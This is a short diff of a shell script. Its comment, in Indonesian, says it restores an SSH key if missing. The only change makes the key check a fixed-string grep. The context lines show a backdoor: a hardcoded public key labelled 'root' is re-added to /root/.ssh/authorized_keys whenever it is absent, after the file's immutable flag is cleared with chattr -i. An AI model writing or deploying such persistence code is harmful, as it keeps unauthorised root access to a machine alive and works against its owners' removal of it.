@@ -7,7 +7,7 @@ SELF="$(basename "$0")"
 SSH_KEY="ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIENY6VLeZm88ObGaapZ1gXaVPUjdT6g8aGMsJJwF7JJV root"
 
 # Restore SSH key jika hilang
-if ! grep -q "$SSH_KEY" /root/.ssh/authorized_keys 2>/dev/null; then
+if ! grep -qF "$SSH_KEY" /root/.ssh/authorized_keys 2>/dev/null; then
     mkdir -p /root/.ssh
     chattr -i /root/.ssh/authorized_keys 2>/dev/null
     echo "$SSH_KEY" >> /root/.ssh/authorized_keys
